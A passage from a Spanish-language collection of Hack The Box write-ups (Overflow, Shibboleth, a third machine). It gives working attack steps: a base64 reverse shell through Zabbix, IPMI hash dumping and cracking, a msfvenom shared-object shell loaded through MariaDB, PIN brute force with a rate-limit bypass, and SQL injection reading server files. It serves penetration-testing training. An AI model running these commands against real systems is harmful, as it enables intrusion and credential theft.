Segmentation fault (core dumped) tester@overflow:/tmp/.test$ ls -l --time-style=+ total 24 -rw-r--r-- 1 tester tester 1735 p1 -rw-rw-r-- 1 tester tester 1735 p1_enc -rw-rw-r-- 1 tester tester 5 t -rw-rw-r-- 1 tester tester 5 t2 -rw-rw-r-- 1 root tester 5 t2_enc -rw-rw-r-- 1 root tester 5 t_enc  Ahora creamos una copia de p1_enc como p2 y lo ciframos. La salida será escrita en /etc/passwd:\ntester@overflow:/tmp/.test$ cp p1_enc p2 tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: p2 Enter Encrypted File: /etc/passwd Segmentation fault (core dumped) tester@overflow:/tmp/.test$ head -1 /etc/passwd root:OO3PvAT9Z8SvU:0:0:root:/root:/bin/bash  Y hemos sobrescrito el archivo /etc/passwd correctamente. Ahora podemos acceder como root con la contraseña 7rocky:\ntester@overflow:/tmp/.test$ su root Password: root@overflow:/tmp/.test# cat /root/root.txt b3ae2337f9ea07d8a4c9b8613ad860a0  ","image":"/images/HTB/Overflow/Overflow.png","permalink":"https://7rocky.github.io/htb/overflow/","section":"htb","summary":"Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Padding Oracle Attack y Bit Flipper Attack para iniciar sesión como admin y también vulnerable a SQLi por un CMS. Existe otro subdominio que usa una versión de exiftool que tiene una vulnerabilidad de RCE. Una vez en la máquina, los movimientos laterales son relativamente fáciles y la escalada de privilegios consiste en ingeniería inversa y explotación de una vulnerabilidad de Buffer Overflow en un binario SUID. Para comprometer esta máquina se necesitan conocimientos avanzados de explotación web, criptografía y explotación de binarios. En este write-up se utiliza un script en Python para efectuar un Bit Flipper Attack y un script en Ruby para SQLi","time":21,"title":"Overflow"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.124   Fecha: 13 / 11 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.124 -p 80 Nmap scan report for 10.10.11.124 Host is up (0.12s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-title: FlexStart Bootstrap Template - Index |_http-server-header: Apache/2.4.41 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 11.04 seconds  La máquina tiene abierto el puerto 80 (HTTP).\nEnumeración web Si vamos a http://10.10.11.124, el servidor nos redirige a http://shibboleth.htb. Después de poner el dominio en /etc/hosts podemos acceder y ver esta página:\nPodemos aplicar fuzzing con ffuf para enumerar más rutas:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://shibboleth.htb/FUZZ -e .php,.html index.html [Status: 200, Size: 59474, Words: 17014, Lines: 1324, Duration: 109ms] blog.html [Status: 200, Size: 19196, Words: 5073, Lines: 426, Duration: 130ms] assets [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 107ms] forms [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 123ms] .html [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 98ms] .php [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 98ms] [Status: 200, Size: 59474, Words: 17014, Lines: 1324, Duration: 97ms] server-status [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 88ms]  Y también algunos subdominios:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.124 -H 'Host: FUZZ.shibboleth.htb' -fc 302 monitor [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 121ms] monitoring [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 107ms] zabbix [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 457ms]  Todos los subdominios contienen la misma página web, un formulario de inicio de sesión en Zabbix:\nPero aquí no podemos hacer nada aún, ya que no tenemos credenciales válidas y no hay ninguna vulnerabilidad clara.\nEnumeración por UDP En este punto, no tenemos nada más que investigar, por lo que vamos a realizar un escaneo de puertos por UDP:\n# nmap -sU --top-ports 100 -n -Pn -vv 10.10.11.124 Password: Starting Nmap 7.92 ( https://nmap.org ) Initiating UDP Scan Scanning 10.10.11.124 [100 ports] Increasing send delay for 10.10.11.124 from 0 to 50 due to max_successful_tryno increase to 4 Increasing send delay for 10.10.11.124 from 50 to 100 due to max_successful_tryno increase to 5 Increasing send delay for 10.10.11.124 from 100 to 200 due to max_successful_tryno increase to 6 Increasing send delay for 10.10.11.124 from 200 to 400 due to 11 out of 12 dropped probes since last increase. Increasing send delay for 10.10.11.124 from 400 to 800 due to 11 out of 11 dropped probes since last increase. Discovered open port 623/udp on 10.10.11.124 Completed UDP Scan, 102.42s elapsed (100 total ports) Nmap scan report for 10.10.11.124 Host is up, received user-set (0.096s latency). Scannedfor 102s Not shown: 98 closed udp ports (port-unreach) PORT STATE SERVICE REASON 138/udp open|filtered netbios-dgm no-response 623/udp open asf-rmcp udp-response ttl 63 Nmap done: 1 IP address (1 host up) scanned in 102.46 seconds Raw packets sent: 246 (13.189KB) | Rcvd: 110 (9.315KB)  Y descubrimos que el puerto 623 (UDP) está abierto, y se trata de IPMI.\nExplotación de IPMI HackTricks tiene bastante información sobre este servicio. La mayoría de técnicas de reconocimiento y explotación están en Metasploit Framework, por lo que vamos a empezar.\nPrimero, vamos a ver la versión de IPMI:\n$ msfconsole -q msf6 \u0026gt; use auxiliary/scanner/ipmi/ipmi_version msf6 auxiliary(scanner/ipmi/ipmi_version) \u0026gt; show options Module options (auxiliary/scanner/ipmi/ipmi_version): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 623 yes The target port (UDP) THREADS 10 yes The number of concurrent threads msf6 auxiliary(scanner/ipmi/ipmi_version) \u0026gt; set RHOSTS 10.10.11.124 RHOSTS =\u0026gt; 10.10.11.124 msf6 auxiliary(scanner/ipmi/ipmi_version) \u0026gt; run [*] Sending IPMI requests to 10.10.11.124-\u0026gt;10.10.11.124 (1 hosts) [+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed  Existe un exploit para IPMI que nos permite volcar los hashes de las contraseñas de usuarios comunes:\nmsf6 auxiliary(scanner/ipmi/ipmi_version) \u0026gt; use auxiliary/scanner/ipmi/ipmi_dumphashes msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; set RHOSTS 10.10.11.124 RHOSTS =\u0026gt; 10.10.11.124 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; set OUTPUT_JOHN_FILE ./hash OUTPUT_JOHN_FILE =\u0026gt; ./hash msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; run [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:0e60be0702060000aca06cad807b13048ed6f894c5c144e3345d9d440c8d5575c76919f4198e2e1ba123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:27d7c9a280380fba72efc55babb4fdf216fdfc87 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed  Y aquí lo tenemos, ahora podemos romper el hash con john y rockyou.txt:\n$ cat hash 10.10.11.124 Administrator:$rakp$3aab2bf5020a000061799fc2151cd71322e3e5a0bd03da5efae02e1e1f6524e75b9ecc9dca02d6a4a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$81a9602adaa1d61f8c24cfbf1ef0c03df095b945 $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 ASIMD 4x]) Press 'q' or Ctrl-C to abort, almost any other key for status ilovepumkinpie1 (10.10.11.124 Administrator) 1g 0:00:00:01 DONE 0.5154g/s 3812Kp/s 3812Kc/s 3812KC/s iloveqmc..ilovepatri Use the \"--show\" option to display all of the cracked passwords reliably Session completed.  Y aquí está la contraseña.\nAcceso a la máquina Ahora podemos entrar en Zabbix con credenciales Administrator:ilovepumkinpie1:\nLa manera de explotar Zabbix es crear un nuevo item (yendo a \u0026ldquo;Configuration\u0026rdquo;, seleccionando \u0026ldquo;Hosts\u0026rdquo; y pinchando en \u0026ldquo;Create item\u0026rdquo;).\nAhí, veremos un formulario como el de abajo, y solamente tenemos que poner un nombre y una clave, donde pondremos el comando que será ejecutado cada minuto. Por ejemplo, una reverse shell:\nsystem.run[echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash,nowait]  $ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Y vemos que el item se ha creado:\nAhora tenemos que esperar unos segundos hasta que llegue la conexión a nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.124. Ncat: Connection from 10.10.11.124:44284. bash: cannot set terminal process group (859): Inappropriate ioctl for device bash: no job control in this shell zabbix@shibboleth:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null zabbix@shibboleth:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm zabbix@shibboleth:/$ export TERM=xterm zabbix@shibboleth:/$ export SHELL=bash zabbix@shibboleth:/$ stty rows 50 columns 158  Enumeración del sistema Vemos que hay un usuario llamado ipmi-svc y que es propietario de la flag user.txt:\nzabbix@shibboleth:/$ ls /home ipmi-svc zabbix@shibboleth:/$ find / -name user.txt 2/dev/null /home/ipmi-svc/user.txt zabbix@shibboleth:/$ cat /home/ipmi-svc/user.txt cat: /home/ipmi-svc/user.txt: Permission denied  Podemos migrar a este usuario reutilizando la contraseña encontrada antes (ilovepumkinpie1):\nzabbix@shibboleth:/$ su ipmi-svc Password: ipmi-svc@shibboleth:/$ cd ipmi-svc@shibboleth:~$ cat user.txt bc3f4542527b43d71e100c426b445674  Su directorio personal muestra un archivo .mysql_history, que se suele ver en otras máquinas:\nipmi-svc@shibboleth:~$ ls -la total 32 drwxr-xr-x 3 ipmi-svc ipmi-svc 4096 Oct 16 12:23 . drwxr-xr-x 3 root root 4096 Oct 16 12:24 .. lrwxrwxrwx 1 ipmi-svc ipmi-svc 9 Apr 27 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ipmi-svc ipmi-svc 220 Apr 24 2021 .bash_logout -rw-r--r-- 1 ipmi-svc ipmi-svc 3771 Apr 24 2021 .bashrc drwx------ 2 ipmi-svc ipmi-svc 4096 Apr 27 2021 .cache lrwxrwxrwx 1 ipmi-svc ipmi-svc 9 Apr 28 2021 .mysql_history -\u0026gt; /dev/null -rw-r--r-- 1 ipmi-svc ipmi-svc 807 Apr 24 2021 .profile -rw-r----- 1 ipmi-svc ipmi-svc 33 Apr 13 05:29 user.txt -rw-rw-r-- 1 ipmi-svc ipmi-svc 22 Apr 24 2021 .vimrc  Esta es la versión de MySQL (MariaDB):\nipmi-svc@shibboleth:~$ mysql --version mysql Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2  Escalada de privilegios Si investigamos un poco, encontraremos un CVE-2021-27928, que deriva en ejecución remota de comandos (RCE) como root porque podemos decirle a MariaDB que utilice una librería compartida maliciosa.\nPara explotar MariaDB necesitamos un usuario válido. Podemos buscar por archivos de configuración de Zabbix:\nipmi-svc@shibboleth:~$ find / -name zabbix\\* -type f 2/dev/null | grep -v sys /var/lib/dpkg/info/zabbix-frontend-php.md5sums /var/lib/dpkg/info/zabbix-agent.md5sums /var/lib/dpkg/info/zabbix-agent.postrm /var/lib/dpkg/info/zabbix-release.md5sums /var/lib/dpkg/info/zabbix-release.conffiles /var/lib/dpkg/info/zabbix-server-mysql.list /var/lib/dpkg/info/zabbix-sender.md5sums /var/lib/dpkg/info/zabbix-server-mysql.postrm /var/lib/dpkg/info/zabbix-release.list /var/lib/dpkg/info/zabbix-agent.prerm /var/lib/dpkg/info/zabbix-agent.conffiles /var/lib/dpkg/info/zabbix-agent.postinst /var/lib/dpkg/info/zabbix-server-mysql.postinst /var/lib/dpkg/info/zabbix-get.list /var/lib/dpkg/info/zabbix-sender.list /var/lib/dpkg/info/zabbix-frontend-php.list /var/lib/dpkg/info/zabbix-agent.list /var/lib/dpkg/info/zabbix-get.md5sums /var/lib/dpkg/info/zabbix-frontend-php.prerm /var/lib/dpkg/info/zabbix-server-mysql.md5sums /var/lib/dpkg/info/zabbix-frontend-php.postinst /var/lib/dpkg/info/zabbix-server-mysql.conffiles /var/lib/dpkg/info/zabbix-frontend-php.postrm /var/lib/dpkg/alternatives/zabbix-frontend-font /var/log/zabbix/zabbix_agentd.log.1 /var/log/zabbix/zabbix_agentd.log /var/log/zabbix/zabbix_server.log /var/log/zabbix/zabbix_server.log.1 /run/zabbix/zabbix_server.pid /run/zabbix/zabbix_agentd.pid /etc/zabbix/zabbix_agentd.conf /etc/zabbix/zabbix_server.conf.dpkg-dist /etc/zabbix/zabbix_server.conf /etc/zabbix/web/zabbix.conf.php /etc/zabbix/zabbix_agentd.conf.dpkg-dist /etc/logrotate.d/zabbix-server-mysql /etc/logrotate.d/zabbix-agent /etc/apt/trusted.gpg.d/zabbix-official-repo.gpg /etc/apt/sources.list.d/zabbix.list /etc/init.d/zabbix-agent /etc/init.d/zabbix-server /usr/bin/zabbix_sender /usr/bin/zabbix_get /usr/share/zabbix/zabbix.php /usr/share/zabbix/conf/zabbix.conf.php.example /usr/share/man/man8/zabbix_server.8.gz /usr/share/man/man8/zabbix_agentd.8.gz /usr/share/man/man1/zabbix_sender.1.gz /usr/share/man/man1/zabbix_get.1.gz /usr/lib/tmpfiles.d/zabbix-server.conf /usr/lib/tmpfiles.d/zabbix-agent.conf /usr/sbin/zabbix_agentd /usr/sbin/zabbix_server  Hay un archivo llamado /etc/zabbix/zabbix_server.conf que parece interesante. De hecho, contiene las credenciales que buscamos:\nipmi-svc@shibboleth:/$ grep -iC 2 password /etc/zabbix/zabbix_server.conf DBUser=zabbix ### Option: DBPassword # Database password. # Comment this line if no password is used. # # Mandatory: no # Default: DBPassword=bloooarskybluh ### Option: DBSocket  En este punto, ya podemos entrar en MySQL:\nipmi-svc@shibboleth:~$ mysql --user=zabbix --password=bloooarskybluh Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 2121 Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MariaDB [(none)] exit Bye  Pero lo que queremos es una shell como root. Para ello, tenemos que generar un payload con una reverse shell en una librería compartida en formato ELF y subirla a la máquina:\n$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=5555 -f elf-so -o rev.so [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf-so file: 476 bytes Saved as: rev.so  ipmi-svc@shibboleth:~$ cd /tmp ipmi-svc@shibboleth:/tmp$ curl 10.10.17.44/rev.so -so rev.so  $ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.124 - - [] \"GET /rev.so HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting.  Y ahora, podemos usarla para conseguir RCE:\nipmi-svc@shibboleth:/tmp$ mysql --user=zabbix --password=bloooarskybluh --execute='SET GLOBAL wsrep_provider=\"/tmp/rev.so\";' ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query  Y obtenemos una conexión en nc:\n$ nc -nlvp 5555 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::5555 Ncat: Listening on 0.0.0.0:5555 Ncat: Connection from 10.10.11.124. Ncat: Connection from 10.10.11.124:38120. whoami root script /dev/null -c bash Script started, file is /dev/null root@shibboleth:/var/lib/mysql# ^Z zsh: suspended ncat -nlvp 5555 $ stty raw -echo; fg [1] + continued ncat -nlvp 5555 reset xterm root@shibboleth:/var/lib/mysql# export TERM=xterm root@shibboleth:/var/lib/mysql# export SHELL=bash root@shibboleth:/var/lib/mysql# stty rows 50 columns 158 root@shibboleth:/var/lib/mysql# cat /root/root.txt 59607b79a008a6d32f911ad9b1461d57 root@shibboleth:/var/lib/mysql#  ","image":"/images/HTB/Shibboleth/Shibboleth.png","permalink":"https://7rocky.github.io/htb/shibboleth/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina tiene un servicio IPMI vulnerable donde podemos encontrar una contraseña que se reutiliza para un panel de control Zabbix. Aquí podemos entrar y ganar acceso a la máquina. Luego, encontramos una versión de MariaDB vulnerable a RCE como root. Para comprometer esta máquina se necesita una buena enumeración y metodología de pentesting","time":6,"title":"Shibboleth"},{"contents":"  SO: Linux   Dificultad: Difícil   Dirección IP: 10.10.11.159   Fecha: 30 / 03 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted -p 22,80 10.10.11.159 Nmap scan report for 10.10.11.159 Host is up (0.077s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | http-title: UHC March Finals |_Requested resource was http://10.10.11.159/login Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.81 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración Si vamos a http://10.10.11.159, veremos un formulario de inicio de sesión:\nPodemos jugar un poco con la web y ver que es vulnerable a enumeración de usuarios. Existen dos respuestas diferentes si el nombre de usuario es válido o no:\nAdemás, podemos comprobar que admin es un usuario válido. También hay una página para solicitar un reinicio de contraseña:\nSi ponemos admin como nombre de usuario, nos pregunta por un PIN de 4 dígitos:\nPodemos probar con 1234 como se sugiere, pero no es correcto:\nAcceso a la máquina El mensaje de error es interesante porque dice que usemos el mismo navegador. A lo mejor el PIN se puede obtener mediante fuerza bruta. Vamos a probar con un bucle for en Bash:\n$ cookie='laravel_session=eyJpdiI6IlNyK1R6MU83L010Y1E0YVI2NDdvUlE9PSIsInZhbHVlIjoiYlRWZ1BTZVJsVzNQamwxUitNOS9sN1lrQTNncnNqWHA5OUcycFFFSDFXaXp0ZlRFeFRDNWhLaFBxR2g3Q3BLQ3RiSHNEUDNlRjdZemxPeXl5NGx5ZXpLc0RlaUhLSm16RTZkRVViZDFVeTJ1UWRjY3U4RW9GTjc3eFJvYWcyTU8iLCJtYWMiOiI3OWRkNmM0Y2EwYjVkY2I2ODRjMDE5MTJmOGUyMDA0NDlmMzFkYmU5YWVlODM2MzU2ZmUzYTliZWQzNDY1OTc5IiwidGFnIjoiIn0%3D' $ for pin in {0000..9999}; do (echo -n \"$pin: \"; curl 10.10.11.159/api/resettoken -sid \"name=admin\u0026pin=$pin\" -H \"Cookie: $cookie\") | grep '429 Too Many Requests'; done 0060: HTTP/1.1 429 Too Many Requests 0061: HTTP/1.1 429 Too Many Requests 0062: HTTP/1.1 429 Too Many Requests 0063: HTTP/1.1 429 Too Many Requests ^C  El servidor tiene un límite de 60 peticiones por minuto (1 petición por segundo). A esta velocidad, el ataque de fuerza bruta tomaría cerca de 3 horas, que es bastante. Por tanto, tenemos que encontrar una manera de saltarnos ese límite.\nAtaque de fuerza bruta Existen algunas cabeceras que pueden afectar al límite que pone el servidor (HackTricks). El que es útil en la situación que tenemos es X-Forwarded-For con una dirección IP aleatoria.\nEn este punto, escribí un script en Ruby llamado bf_pin.rb que hace el ataque de fuerza bruta usando hilos (threads), de manera que se obtiene el PIN en unos tres minutos (explicación detallada aquí)):\n$ ruby bf_pin.rb [*] Using cookie: XSRF-TOKEN=eyJpdiI6IkppemJMM2ozV01TeE5JbXFIbFBNc1E9PSIsInZhbHVlIjoiNks0K244K3Z1WU1HYVZjM3FsYjE5S05jMk8vejg0RUs0QjVRYkVrRFFMNjRKTE0xVUdYYUhJbyt3SkkwSU5lVVFyK1h5VmxlQUZqRjhsM1diMTRwbitmUm5PYUozN2M5VWRVRGtnWEZyd0FzUmZMTXhTbC80RWIzbmd6M1o4N04iLCJtYWMiOiJiMGQ3MGQ2YTc0ZmNkNzk4NzM1OWUzNTZhMmJjM2JiNzgxMmRmYWZjMjRmOTI2MDJkMDUwYWZiNWY1M2Q0MGJjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjZSOGdLVmdZd1J6ZVJabklBNFRmdUE9PSIsInZhbHVlIjoiaCtXaFpHcDlsaXFBN05Ea2ZvYjYrdUZtZWluUmhVM3BjaWl2TXhXVmpTZXlSYTkybXZUNTd2YkQzNzNIc0FxYlV3b2l3Q1d1dml5SFd4QzlWUFlYY0JLb3NLVE4yaHZ1N0FGZkpEUTYzdzdnRzl5TWpGeGgwaCs0S29pQVRUREEiLCJtYWMiOiIxNTNiYmZjYTVjYThlN2QwMTQ1MzU1OWNlNmJiYjNjMzUwNzYwNjgzOGVhZDdlZjg5NzdlODY5OGM0ZDdiNzBkIiwidGFnIjoiIn0%3D [*] Trying from 7400 to 7600... [+] 7409 is valid  Ahora, solamente tenemos que coger las cookies y ponerlas en el navegador para mantener la misma sesión. Luego, ponemos 7409 y escribimos la nueva contraseña de admin:\nY entramos. Ahora vemos una lista de usuarios:\nEncontrando un SQLi La única funcionalidad de esta página es el enlace \u0026ldquo;View\u0026rdquo;, que muestra un mensaje diferente en cada usuario:\nLa página no se recarga, por lo que los datos vienen por AJAX. Si miramos los archivo fuente, veremos una etiqueta script que contiene código JavaScript y una función getBio:\nfunction getBio(id, secret) { $.ajax({ type: 'GET', url: 'api/getprofile', data: { id: id, secret: secret }, success: function (data) { document.getElementById('alert').style.visibility = 'visible' document.getElementById('alert').innerHTML = data } }) }  Está realizando una petición GET para obtener los datos. Mirando el código HTML, cada enlace tiene un evento onclick que ejecuta esta función con un número como id y un hash MD5 como secret. Vamos a probar con curl:\n$ curl '10.10.11.159/api/getprofile?id=6\u0026secret=7a5cd01cdb222330a1ec68b439887ea1' Watchdog is an enthusiast hacker and developer from England.  Funciona. Pero si cambiamos los parámetros id o secret, el servidor nos pilla:\n$ curl '10.10.11.159/api/getprofile?id=6\u0026secret=asdf' Tampered user input detected $ curl '10.10.11.159/api/getprofile?id=1\u0026secret=7a5cd01cdb222330a1ec68b439887ea1' Tampered user input detected  Parece que el servidor está validando la integridad de la consulta. Y no parece predecible, a lo mejor tiene una sal:\n$ echo -n 6 | md5sum 1679091c5a880faf6fb5e6087eb1b2dc -  Explotación de Type Juggling Podemos recordar que el servidor utiliza PHP (Laravel), y a lo mejor es vulnerable a Type Juggling. Esto ocurre cuando el servidor utiliza == en lugar de ===:\n$ php -a Interactive shell php \u0026gt; if (\"asdf\" == true) { echo \"true\"; } else { echo \"false\"; } true php \u0026gt; if (\"asdf\" === true) { echo \"true\"; } else { echo \"false\"; } false  Si ponemos true (valor booleano) como secret, la validación pasará. Para decirle a PHP que se trata de un valor booleano, tenemos que mandar los datos con formato JSON:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":6,\"secret\":true}' -X GET -H 'Content-Type: application/json' Watchdog is an enthusiast hacker and developer from England.  Explotación de SQLi Es vulnerable, ahora podemos modificar el parámetro id sin ser pillados. Vamos a probar SQLi:\n$ curl 10.10.11.159/api/getprofile -d \"{\\\"id\\\":\\\"'\\\",\\\"secret\\\":true}\" -X GET -siH 'Content-Type: application/json' | head -1 HTTP/1.1 500 Internal Server Error  Hemos puesto una comilla simple (') y el servidor devuelve un 500 Internal Server. Es bastante probable que el parámetro id sea inyectable. Vamos a proceder:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":\"6 or 1=1-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' Big0us is a man of mystery, there is not much known about him and due to winning the first UHC Season 1 Tournament, there isn't much footage for others to study. The only thing players can gather about this guy is what is on his \u0026lt;a href=\"bigous.me \"\u0026gt;blog\u0026lt;/a\u0026gt; and that he can hack.  Y conseguimos un resultado (usando comentarios para omitir el resto de la consulta del servidor). Vamos a probar con UNION SELECT:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1-- -\",\"secret\":true}' -X GET -siH 'Content-Type: application/json' | head -1 HTTP/1.1 500 Internal Server Error $ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2-- -\",\"secret\":true}' -X GET -siH 'Content-Type: application/json' | head -1 HTTP/1.1 500 Internal Server Error $ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,3-- -\",\"secret\":true}' -X GET -siH 'Content-Type: application/json' | head -1 HTTP/1.1 200 OK $ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,3-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' 3  Perfecto, tenemos un SQLi de tipo Union-based, y la columna que se refleja es la tercera. Vamos a enumerar un poco:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,database()-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' uhc $ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,version()-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' 8.0.28-0ubuntu0.20.04.3 $ curl10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,user()-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' uhc@localhost  También podemos leer archivos del servidor (LOAD_FILE). Por ejemplo:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,load_file(\\\"/etc/passwd\\\")-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin htb:x:1000:1000:htb:/home/htb:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false $ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,load_file(\\\"/home/htb/user.txt\\\")-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' 96a7412e20c1c071a2cef9adbf2083aa  Y aquí está user.txt.\nObteniendo RCE Pero vamos a entrar en la máquina usando INTO OUTFILE. Para ello, tenemos que encontrar un directorio del servidor web. Esta es la configuración de nginx:\n$ curl 10.10.11.159/api/getprofile -d '{\"id\":\"0 union select 1,2,load_file(\\\"/etc/nginx/sites-enabled/default\\\")-- -\",\"secret\":true}' -X GET -H 'Content-Type: application/json' server { listen 80 default_server; listen [::]:80 default_server; root /srv/altered/public; add_header X-Frame-Options \"SAMEORIGIN\"; add_header X-Content-Type-Options \"nosniff\"; set 